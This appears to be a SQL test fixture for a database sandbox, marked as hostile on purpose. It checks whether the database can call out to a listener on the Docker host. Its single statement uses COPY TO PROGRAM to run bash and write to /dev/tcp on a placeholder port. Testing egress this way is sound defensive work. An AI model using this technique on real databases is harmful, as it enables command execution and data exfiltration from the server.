-- Hostile on purpose. Tries to call out of the database to a listener on the host.
-- The test replaces __PORT__ with a real port before it runs this.
copy (select 1) to program 'bash -c "echo hi > /dev/tcp/host.docker.internal/__PORT__"';
